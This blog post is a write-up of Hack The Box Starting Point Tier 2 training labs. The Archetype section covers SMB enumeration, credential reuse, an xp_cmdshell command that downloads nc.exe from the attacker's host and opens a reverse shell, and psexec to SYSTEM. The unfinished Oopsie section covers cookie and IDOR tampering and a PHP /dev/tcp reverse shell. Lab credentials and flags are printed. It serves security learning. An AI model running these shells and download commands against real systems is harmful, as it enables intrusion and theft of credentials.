---
title: 'HTB Starting Point - Tier 2'
description: 'Hack the Box Starting Point'
pubDate: 'Dec 13 2024'
heroImage: '/blog-placeholder-1.jpg'
---

Topics covered:  
* XXE
* IDOR
* Log4J
* Cookie manipulation
* PrivEsc
* LXD for privileged filesystem access


## Archetype
*MSSQL, SMB, PS1, RCE*

**Task 1**  
Which TCP port is hosting a database server?

```bash
kali$ nmap -sV $TARGET --min-rate=2000

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

Looks like the answer is 1433.

From the list above:
* 135: RPC. (Low level and insecure network comms to invoke a remote procedure)
* 139: Typically used by SMB to communicate with old devices. This is for SMB over NBT (NetBIOS over TCP/IP)
* 445: SMB server

This [stack overflow answer](https://superuser.com/a/694480) provides a great summary of the relationship between SMB and NetBIOS. In short: SMB and NetBIOS are different protocols, however to support legacy Windows systems, SMB can use the NetBIOS API to talk with older machines. See the diagram in the link.


**Task 2**  
What is the name of the non-Administrative share available over SMB?

```bash
kali$ smbclient -L $TARGET -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

Looks like it is `backups`. (N.b. admin shares typically have a `$` suffix)


**Task 3**  
What is the password identified in the file on the SMB share?

```bash
kali$ smbclient //$TARGET/backups

smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
		5056511 blocks of size 4096. 2522480 blocks available

smb: \> print prod.dtsConfig
NT_STATUS_ACCESS_DENIED opening remote file prod.dtsConfig

smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

No permissions were allowed to print the file, however I could use get instead. By reading the file contents, we find this spicy connection string with these credentials `ARCHETYPE\sql_svc; M3g4c0rp123`

```xml
 <ConfiguredValue>
    Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;
</ConfiguredValue>
 ```


**Task 4**  
What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

Impacket is designed to deal with network packets, "providing low-level programmatic access". Looking through the [repo](https://github.com/fortra/impacket/tree/master), I can see `mssqlshell.py` and `mssqlattack.py` example files. The attack utilises the shell script. (N.b. These are classes, not scripts! :facepalm:). Looks like the script I'm after is `mssqlclient`. In Kali, this is already installed and on the path. It can be executed by `impacket-mssqlclient`.

```bash
kali$ impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@$TARGET -windows-auth
```

> We need the `-windows-auth` flag because the account belongs to the machine, not to the SQL service. As per the help menu: "this flag is specified to use Windows Authentication". It's like when you run a DB on your windows machine - there is often a default provisioned account specific to SQL, alternatively, you can authenticate to the DB via your machine/domain controller.

**Task 5**  
What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

[`xp_cmdshell`](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16)


**Task 6**  
What script can be used in order to search possible paths to escalate privileges on Windows hosts?

`winpeas` apparently :shrug:


**Task 7**  
What file contains the administrator's password?

At this point, I can execute commands via `xp_cmdshell`. It seems pertinent to create a reverse shell. This will allow us a more stable connection and remove the need to type `xp_cmdshell` on every line. From the writeups I researched online, it seems like the answer to this question only comes by solving the next two tasks (including obtaining a reverse shell, looking for privesc opportunities, and the like). After all of that, the answer is `ConsoleHost_History.txt` in the `~/AppData/Roaming/...PSReadline/` folder


**Task 8**  
Submit user flag

```
# Kali
kali$ python3 -m http.server 80 &
kali$ nc -lvnp 443

# mssql client
mssql> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget 10.10.15.212/nc.exe -outfile nc.exe; .\nc.exe -e cmd.exe 10.10.15.212 443"

# Kali netcat session (reverse shell)
C:\Users\sql_svc\Downloads> type ..\Desktop\user.txt
3e7b102e78218e935bf3f4951fec21a3
```

**Task 9**  
Submit root flag

Now that we have a reverse shell, we can download winPEAS from our attacking machine

```
C:\Users\sql_svc\Downloads> powershell -c wget http://10.10.15.212/winPEASx64.exe -outfile winPEASx64.exe
C:\Users\sql_svc\Downloads> .\winPEASx64.exe
```

Looking through the output of winPEAS, we can take a look for anything interesting that we could easily leverage. Unfortunately for me, unlike the writeup for the box, winPEAS did not suggest the `ConsoleHost_History.txt` file. In any case, looking at the file, we find some credentials, as seen below. To gain admin, we can use the `runas` command

```cmd
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

From here, I tried to make use of a `runas` command, however it would not let me type in a password. As a result, I instead used impacket's `psexec` script.

```
kali$ impacket-psexec administrator@$TARGET

Password: ***

C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
b91ccec3305e98240082d4474b848528
```


## Oopsie
**PHP, Apache, Insecure Direct Object Reference, Authentication bypass**

**Task 1**  
With what kind of tool can intercept web traffic?  

`proxy`


**Task 2**  
What is the path to the directory on the webserver that returns a login page?  

NMAP
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 19:42 EST
Nmap scan report for 10.129.95.191
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
```

There is a web server on port 80. Let's enumerate the web directories with gobuster

```
kali$ gobuster dir -u $TARGET -w ~/Documents/git/SecLists/Discovery/Web-Content/common.txt
kali$ gobuster dir -u $TARGET -w ~/Documents/git/SecLists/Discovery/Web-Content/Logins.fuzz.txt
```

Unfortunately neither of these yielded results. From looking at the writeup, they mention that Burpsuite can create a sitemap for you. Let's take that idea of a web crawler and use another tool in Kali: `gospider`:

```
kali$ gospider -s http://$TARGET -o site-crawl
[url] - [code-200] - http://10.129.95.191
[javascript] - http://10.129.95.191/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js
[javascript] - http://10.129.95.191/js/min.js
[javascript] - http://10.129.95.191/cdn-cgi/login/script.js
[javascript] - http://10.129.95.191/js/index.j
```

We see the directory `cdn-cgi/login` contains a login script. Visiting the page we are met with a login prompt

**Task 3**  
What can be modified in Firefox to get access to the upload page?  

After logging in as guest on `http://$TARGET/cdn-cgi/login`, we are granted access to a web portal for MegaCorp Automotive - Repair Management System.

![Guest access to the Repair Management System](/public/img/blog/htb-starting-point/oopsie-guest-access.png)

Inspecting the cookies, we see the following values. If we can find the user id for the super admin, we may be able to get access to the uploads page. 
```
role=guest
user=2233
```

From here, we notice that the Accounts page is vulnerable to insecure direct object reference - so we can iterate through the account ids in order to find our admin user and obtain their user id. The guest user has an id of `2`. Decrementing that to `1`, we find the details for the admin: user id `34322`. Let's exploit!

```
role=guest
user=34322
```

Success!
![Guest access to the Repair Management System](/public/img/blog/htb-starting-point/oopsie-uploads-access.png)


**Task 4**  
What is the access ID of the admin user?  

`34322` as per the above


**Task 5**  
On uploading a file, what directory does that file appear in on the server?  

Uploading a random txt file, let's go hunting.
```
kali$ gobuster fuzz -u $TARGET/FUZZ/nmap.txt -c user=34322 -w ~/Documents/git/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
```

Unfortunately the above returned 404 on every option. Let's simplify a bit and just enumerate directories in case there is some web server logic blocking us from accessing the file.

```
kali$ gobuster dir -x php -u $TARGET -w ~/Documents/git/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.191
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Documents/git/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 10932]
/images               (Status: 301) [Size: 315] [--> http://10.129.95.191/images/]
/themes               (Status: 301) [Size: 315] [--> http://10.129.95.191/themes/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.95.191/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.95.191/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.95.191/js/]
Progress: 2150 / 175330 (1.23%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 2160 / 175330 (1.23%)
===============================================================
Finished
===============================================================
```

There appears to be an `uploads` folder sitting behind some authentication. This auth may explain the 404 behaviour from earlier. In any case, when trying to access the file such as `/uploads/nmap.txt`, the server may still try to read or invoke the file. As such, let's try upload a PHP reverse shell in the hopes it gets executed.

```php
<?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP/1337> 0>&1'");
?>
```

We set up a netcat listener on our machine, and try to get the file from the web server... According to writeup, this should work, but it hasn't. Hmmm... Something for next week



**Task 6**  
What is the file that contains the password that is shared with the robert user?  


**Task 7**  
What executable is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?  


**Task 8**  
Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?  


**Task 9**  
What SUID stands for?  


**Task 10**  
What is the name of the executable being called in an insecure manner?  


**Task 11**  
Submit user flag  


**Task 12**  
Submit root flag  